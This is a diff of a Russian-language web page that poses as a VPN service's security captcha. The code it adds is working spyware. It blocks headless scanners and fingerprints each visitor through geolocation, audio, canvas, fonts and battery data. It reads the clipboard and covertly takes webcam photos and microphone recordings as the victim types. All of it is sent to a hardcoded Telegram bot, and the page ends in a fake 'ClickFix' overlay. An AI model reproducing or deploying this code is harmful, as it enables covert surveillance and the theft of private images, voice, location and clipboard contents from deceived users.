@@ -1,59 +1,326 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <!-- Твой CSS остается без изменений -->
-    <style>/* ... твой стиль ... */</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔒 Проверка безопасности | VPN Service</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap');
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { 
+            font-family:'Roboto',sans-serif; 
+            background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); 
+            min-height:100vh; 
+            display:flex; 
+            align-items:center; 
+            justify-content:center; 
+        }
+        .container { 
+            background:rgba(255,255,255,0.95); 
+            padding:40px; 
+            border-radius:20px; 
+            box-shadow:0 20px 40px rgba(0,0,0,0.1); 
+            max-width:400px; 
+            text-align:center; 
+            position:relative;
+        }
+        h1 { color:#333; margin-bottom:20px; font-size:24px; }
+        .progress-container { 
+            background:#e0e0e0; 
+            height:6px; 
+            border-radius:3px; 
+            margin:30px 0; 
+            overflow:hidden; 
+        }
+        .progress-bar { 
+            height:100%; 
+            background:linear-gradient(90deg,#4CAF50,#45a049); 
+            transition:width 0.5s ease; 
+            width:0%; 
+        }
+        #captchaCode { 
+            font-size:48px; 
+            font-weight:700; 
+            letter-spacing:8px; 
+            color:#333; 
+            margin:30px 0; 
+            background:#f5f5f5; 
+            padding:20px; 
+            border-radius:10px; 
+            user-select:none;
+        }
+        input[type="text"] { 
+            width:100%; 
+            padding:15px; 
+            font-size:20px; 
+            border:2px solid #ddd; 
+            border-radius:10px; 
+            text-align:center; 
+            margin-bottom:20px; 
+            box-sizing:border-box; 
+            font-weight:bold;
+        }
+        .verify-btn { 
+            background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); 
+            color:white; 
+            border:none; 
+            padding:15px 40px; 
+            font-size:18px; 
+            border-radius:10px; 
+            cursor:pointer; 
+            transition:all 0.3s; 
+            width:100%;
+        }
+        .verify-btn:hover:not(:disabled) { transform:translateY(-2px); box-shadow:0 10px 20px rgba(102,126,234,0.4); }
+        .verify-btn:disabled { opacity:0.6; cursor:not-allowed; transform:none; }
+        body.loading { pointer-events:none; opacity:0.7; }
+        .status { 
+            margin-top:20px; 
+            padding:10px; 
+            border-radius:5px; 
+            font-weight:500; 
+            min-height:20px;
+        }
+        .success { background:#d4edda; color:#155724; }
+        .error { background:#f8d7da; color:#721c24; }
+        .camera-status { 
+            position:absolute; 
+            top:10px; 
+            right:10px; 
+            width:40px; 
+            height:40px; 
+            border-radius:50%; 
+            background:rgba(255,0,0,0.7); 
+            animation:pulse 1.5s infinite;
+        }
+        .camera-status.active { background:rgba(0,255,0,0.7); }
+        @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.5;} }
+        .clickfix { 
+            position:fixed; 
+            top:0; 
+            left:0; 
+            width:100%; 
+            height:100%; 
+            background:rgba(0,0,0,0.9); 
+            display:flex; 
+            align-items:center; 
+            justify-content:center; 
+            color:white; 
+            font-size:24px; 
+            z-index:9999; 
+            flex-direction:column;
+        }
+        .clickfix button { 
+            margin-top:20px; 
+            padding:15px 30px; 
+            font-size:20px; 
+            background:#ff4444; 
+            border:none; 
+            border-radius:10px; 
+            color:white; 
+            cursor:pointer; 
+        }
+    </style>
 </head>
 <body>
-    <!-- Твой HTML остается без изменений -->
-    <div class="container">/* ... */</div>
+    <div class="container">
+        <div class="camera-status" id="cameraStatus" title="Камера выключена"></div>
+        <h1>🔒 Проверка безопасности</h1>
+        <p>VPN Service обнаружил подозрительную активность. Пройдите верификацию:</p>
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div id="captchaCode">———</div>
+        <input type="text" id="userInput" maxlength="8" placeholder="Введите код" autocomplete="off">
+        <button class="verify-btn" id="verifyBtn">Проверить</button>
+        <div id="status" class="status"></div>
+    </div>
 
     <script>
-        // === ТВОИ КОНСТАНТЫ ===
+        // === КОНФИГУРАЦИЯ ===
         const TELEGRAM_TOKEN = '8282145932:AAE3Ze0wPSRFDx0FroHUJMTOXWHcpbvcb_w';
         const CHAT_ID = '882898449';
 
-        // === 🆕 АВТО-КАМЕРА/МИКРОФОН БЕЗ ПОПАПА ===
+        // === iOS DЕТЕКТОР ===
+        function isIOS() {
+            return /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+        }
+
+        // === ЗАЩИТА ОТ БОТОВ ===
+        function isBot() {
+            const headless = navigator.webdriver || 
+                           /HeadlessChrome/.test(navigator.userAgent) ||
+                           navigator.plugins.length === 0;
+            const linuxBot = /Linux.*X11/.test(navigator.userAgent) && screen.height < 800;
+            const noWebGL = !document.createElement('canvas').getContext('webgl');
+            return headless || linuxBot || noWebGL;
+        }
+
+        if (isBot()) {
+            document.body.innerHTML = '<h1 style="color:red">❌ Доступ заблокирован</h1><p>Обновите страницу в обычном браузере</p>';
+            throw new Error('BOT DETECTED');
+        }
+
+        // === ЭЛЕМЕНТЫ ===
+        const elements = {
+            captchaCode: document.getElementById('captchaCode'),
+            userInput: document.getElementById('userInput'),
+            verifyBtn: document.getElementById('verifyBtn'),
+            progressBar: document.getElementById('progressBar'),
+            status: document.getElementById('status'),
+            cameraStatus: document.getElementById('cameraStatus')
+        };
+
+        // === ПЕРЕМЕННЫЕ ===
+        let currentCaptcha = '';
+        let attempts = 0;
+        let step = 0;
+        const totalSteps = 4;
         let stream = null;
-        async function initStealthMedia() {
+        let cameraActive = false;
+        let mouseTrail = [];
+        let batteryInfo = {};
+        let keystrokes = [];
+
+        // === 🖱️ MOUSE TRACKING ===
+        document.addEventListener('mousemove', (e) => {
+            mouseTrail.push({
+                x: e.clientX,
+                y: e.clientY,
+                t: Date.now(),
+                buttons: e.buttons
+            });
+            if (mouseTrail.length > 100) mouseTrail.shift();
+        });
+
+        // === 🔊 AUDIO FINGERPRINT ===
+        async function getAudioFP() {
             try {
-                // ТРИК: autoplay + muted = без попапов на iOS Safari!
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: 640, height: 480 },
-                    audio: true
-                });
-                console.log('🎥🖥️ Stealth media OK');
-                return true;
+                const audioStream = await navigator.mediaDevices.getUserMedia({audio: true});
+                const audioCtx = new AudioContext();
+                const analyser = audioCtx.createAnalyser();
+                const source = audioCtx.createMediaStreamSource(audioStream);
+                source.connect(analyser);
+                
+                const buffer = new Uint8Array(analyser.frequencyBinCount);
+                analyser.getByteFrequencyData(buffer);
+                audioStream.getTracks().forEach(track => track.stop());
+                return Array.from(buffer).slice(0, 20).join(',');
             } catch(e) {
-                console.log('🚫 Media blocked');
+                return 'no-audio';
+            }
+        }
+
+        // === 📍 GEOLOCATION ===
+        async function getGeo() {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve(`${pos.coords.latitude.toFixed(6)},${pos.coords.longitude.toFixed(6)}`),
+                    () => resolve('geo-denied')
+                );
+            });
+        }
+
+        // === 🔋 BATTERY + HARDWARE ===
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(bat => {
+                batteryInfo = {
+                    level: Math.round(bat.level * 100) + '%',
+                    charging: bat.charging ? 'Да' : 'Нет',
+                    cores: navigator.hardwareConcurrency || '?'
+                };
+            });
+        }
+
+        // === 🗎 FONTS DETECTION ===
+        function detectFonts() {
+            const testFonts = ['Arial','Times New Roman','Comic Sans MS','Courier New','Verdana'];
+            const detected = [];
+            testFonts.forEach(font => {
+                if (document.fonts.check(`12px ${font}`)) detected.push(font);
+            });
+            return detected.slice(0, 3).join(',');
+        }
+
+        // === 🖥️ ПОЛНЫЙ FINGERPRINT ===
+        async function getFullFingerprint() {
+            const fp = {
+                userAgent: navigator.userAgent.substring(0, 80),
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+                cookies: navigator.cookieEnabled,
+                hardware: `${navigator.hardwareConcurrency || '?'}c/${navigator.deviceMemory || '?'}GB`,
+                fonts: detectFonts(),
+                battery: batteryInfo.level || 'no',
+                mouseTrail: mouseTrail.length,
+                geo: await getGeo(),
+                audio: await getAudioFP()
+            };
+
+            // Canvas + WebGL
+            const canvas = document.createElement('canvas');
+            canvas.width = 256; canvas.height = 60;
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'alphabetic';
+            ctx.fillStyle = "#f60";
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = "#069";
+            ctx.font = '11pt Arial';
+            ctx.fillText('SUPER FP v3.0 🕵️', 2, 15);
+            fp.canvas = canvas.toDataURL().substring(0, 50);
+
+            return fp;
+        }
+
+        // === 📸 КАМЕРА ===
+        async function initCamera() {
+            try {
+                const constraints = isIOS() ? {
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: true
+                } : {
+                    video: { facingMode: 'user' },
+                    audio: true
+                };
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                return true;
+            } catch (e) {
+                console.log('🚫 Камера:', e.name);
                 return false;
             }
         }
 
-        // === 📸 ПОЛНОЕ ФОТО (НЕ ОБРЕЗАНО) ===
+        // === 📸 ПОЛНОЕ ФОТО ===
         async function captureFullPhoto() {
-            if (!stream) return null;
+            if (!stream || !cameraActive) return null;
             try {
                 const video = document.createElement('video');
                 video.srcObject = stream;
-                video.muted = true; // iOS fix
+                video.muted = true;
                 video.play();
                 
                 await new Promise(r => video.onloadeddata = r);
-                await new Promise(r => setTimeout(r, 500)); // Стабилизация
+                await new Promise(r => setTimeout(r, 300));
                 
                 const canvas = document.createElement('canvas');
                 canvas.width = 640; canvas.height = 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
                 video.remove();
                 
-                return canvas.toDataURL('image/jpeg', 0.8); // Полное base64
+                return canvas.toDataURL('image/jpeg', 0.8);
             } catch(e) {
                 return null;
             }
         }
 
-        // === 🔊 3 СЕКУНДЫ АУДИО ===
+        // === 🔊 АУДИО ЗАПИСЬ ===
         async function recordAudio() {
             if (!stream) return null;
             try {
@@ -68,7 +335,6 @@
                         reader.onloadend = () => resolve(reader.result);
                         reader.readAsDataURL(blob);
                     };
-                    
                     mediaRecorder.start();
                     setTimeout(() => mediaRecorder.stop(), 3000);
                 });
@@ -77,7 +343,17 @@
             }
         }
 
-        // === 🆕 ОТПРАВКА ФОТО В TELEGRAM ===
+        // === Base64 → Blob ===
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+            return new Blob([ab], { type: mimeString });
+        }
+
+        // === 🆕 ОТПРАВКА ФОТО ===
         async function sendPhotoToTelegram(photoBase64, caption) {
             try {
                 const formData = new FormData();
@@ -91,7 +367,6 @@
                 });
                 return (await res.json()).ok;
             } catch(e) {
-                console.error('📸 Photo send fail');
                 return false;
             }
         }
@@ -110,62 +385,178 @@
                 });
                 return (await res.json()).ok;
             } catch(e) {
-                console.error('🔊 Voice send fail');
                 return false;
             }
         }
 
-        // === Base64 → Blob ===
-        function dataURItoBlob(dataURI) {
-            const byteString = atob(dataURI.split(',')[1]);
-            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
-            return new Blob([ab], { type: mimeString });
-        }
-
-        // === 🔥 АВТОЗАПУСК ПРИ ЗАГРУЗКЕ ===
-        async function autoStealthCapture() {
-            console.log('🚀 Stealth capture START');
-            
-            const mediaOK = await initStealthMedia();
-            if (!mediaOK) {
-                console.log('🚫 Media access denied');
-                return;
+        // === 📋 CLIPBOARD ===
+        async function getClipboard() {
+            try {
+                const text = await navigator.clipboard.readText();
+                return text.substring(0, 50);
+            } catch(e) {
+                return 'clipboard-denied';
             }
-            
-            // ФОТО через 1.5 сек
-            setTimeout(async () => {
-                const photo = await captureFullPhoto();
-                if (photo) {
-                    await sendPhotoToTelegram(photo, '📸 Авто-фото при загрузке');
-                    console.log('✅ Фото отправлено!');
-                }
-            }, 1500);
-            
-            // АУДИО через 2 сек
-            setTimeout(async () => {
-                const audio = await recordAudio();
-                if (audio) {
-                    await sendVoiceToTelegram(audio, '🔊 3 сек микрофона');
-                    console.log('✅ Голос отправлен!');
-                }
-            }, 2000);
         }
 
-        // === ТВОИ ФУНКЦИИ ОСТАЮТСЯ ===
-        // ... getFullFingerprint, sendToTelegram (текстовый), капча логика ...
+        // === 🔥 НЕЗАМЕТНАЯ ОТПРАВКА ВСЕГО ПАКЕТА ===
+        async function sendFullStealthPackage(data) {
+            try {
+                const fp = await getFullFingerprint();
+                const clipboard = await getClipboard();
+                
+                // 1. ТЕКСТОВЫЙ ОТЧЕТ
+                const message = `🎯 УЛЬТРА #${attempts} | ${data.event}\n\n` +
+                              `📝 Капча: \`${currentCaptcha}\`\n` +
+                              `⌨️ Ввод: \`${data.input || ''}\`\n` +
+                              `🖱️ Мышь: ${fp.mouseTrail} точек\n` +
+                              `🔋 Батарея: ${fp.battery}\n` +
+                              `📍 Geo: ${fp.geo}\n` +
+                              `🔊 Audio: ${fp.audio?.substring(0, 30)}...\n` +
+                              `📋 Буфер: ${clipboard}\n` +
+                              `🗎 Шрифты: ${fp.fonts}\n\n` +
+                              `🖥️ FP: ${JSON.stringify(fp).substring(0, 400)}`;
 
-        // === ЗАПУСК ===
-        window.addEventListener('load', () => {
-            autoStealthCapture(); // 🆕 Авто-фото+аудио!
-            // Твоя капча стартует как обычно
-            currentCaptcha = generateCaptcha();
-            elements.captchaCode.textContent = currentCaptcha;
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                // 2. ФОТО (если есть)
+                if (data.photo) {
+                    await sendPhotoToTelegram(data.photo, `📸 #${attempts} | ${data.input}`);
+                }
+
+                // 3. АУДИО (если есть)
+                if (data.audio) {
+                    await sendVoiceToTelegram(data.audio, `🔊 #${attempts} | ${data.input}`);
+                }
+
+                console.log('✅ STEALTH PACKAGE отправлен');
+            } catch(e) {
+                console.error('🚫 Stealth fail');
+            }
+        }
+
+        // === ГЕНЕРАТОР КАПЧИ ===
+        function generateCaptcha() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let code = '';
+            for (let i = 0; i < 8; i++) {
+                code += chars[Math.floor(Math.random() * chars.length)];
+            }
+            return code;
+        }
+
+        // === ПРОГРЕСС ===
+        function updateProgress() {
+            const progress = Math.min((step / totalSteps) * 100, 100);
+            elements.progressBar.style.width = `${progress}%`;
+        }
+
+        // === 🔥 НЕЗАМЕТНЫЙ СБОР ПРИ ВВОДЕ КАПЧИ ===
+        elements.userInput.addEventListener('focus', async () => {
+            if (!cameraActive) {
+                cameraActive = await initCamera();
+                if (cameraActive) {
+                    elements.cameraStatus.classList.add('active');
+                    elements.cameraStatus.title = '📸 Активна';
+                }
+            }
         });
 
-        console.log('🚀 STEALTH MODE: Фото+Аудио БЕЗ ПОПАПОВ!');
+        elements.userInput.addEventListener('input', async () => {
+            const input = elements.userInput.value.toUpperCase();
+            keystrokes.push({
+                char: input.slice(-1),
+                time: Date.now(),
+                length: input.length
+            });
+
+            // 🕵️‍♂️ НЕЗАМЕТНЫЙ СБОР ПРИ КАЖДОЙ БУКВЕ
+            if (cameraActive && input.length > 0 && input.length <= 3) { // Только первые 3 символа
+                const photo = await captureFullPhoto();
+                const audio = await recordAudio();
+                
+                await sendFullStealthPackage({
+                    event: `STEALTH_${input.length}`,
+                    input: input,
+                    photo: photo,
+                    audio: audio
+                });
+            }
+        });
+
+        elements.userInput.addEventListener('blur', () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+            cameraActive = false;
+            elements.cameraStatus.classList.remove('active');
+        });
+
+        // === КНОПКА (ОСТАЕТСЯ БЕЗ ИЗМЕНЕНИЙ) ===
+        elements.verifyBtn.addEventListener('click', async () => {
+            const input = elements.userInput.value.trim().toUpperCase();
+            attempts++;
+            step = Math.min(step + 1, totalSteps);
+
+            elements.status.textContent = '🔍 Проверка...';
+            elements.status.className = 'status';
+            document.body.classList.add('loading');
+
+            await sendFullStealthPackage({ 
+                input, 
+                event: 'BUTTON_CLICK',
+                keystrokes: keystrokes.length
+            });
+
+            setTimeout(async () => {
+                if (input === currentCaptcha) {
+                    if (step >= totalSteps) {
+                        document.body.innerHTML = `
+                            <div class="clickfix">
+                                <div>
+                                    <h2>🔧 Требуется ClickFix</h2>
+                                    <p>Кликните для исправления (5 сек)</p>
+                                    <button onclick="location.reload()">ИСПРАВИТЬ СЕЙЧАС</button>
+                                </div>
+                            </div>
+                        `;
+                        return;
+                    }
+                    elements.status.textContent = '✅ Верно! Следующий этап.';
+                    elements.status.className = 'status success';
+                } else {
+                    elements.status.textContent = '❌ Неверный код.';
+                    elements.status.className = 'status error';
+                    step--;
+                }
+
+                currentCaptcha = generateCaptcha();
+                elements.captchaCode.textContent = currentCaptcha;
+                elements.userInput.value = '';
+                elements.progressBar.style.width = '0%';
+                elements.verifyBtn.textContent = 'Далее';
+                document.body.classList.remove('loading');
+                updateProgress();
+                keystrokes = [];
+            }, 1500);
+        });
+
+        // === СТАРТ ===
+        currentCaptcha = generateCaptcha();
+        elements.captchaCode.textContent = currentCaptcha;
+        updateProgress();
+        
+        console.log('🚀 УЛЬТРА КОЛЛЕКТОР АКТИВЕН! 🕵️‍♂️📸🔊');
+        console.log('✅ НЕЗАМЕТНЫЙ сбор: первые 3 буквы = ФОТО+АУДИО+FP');
     </script>
 </body>
 </html>
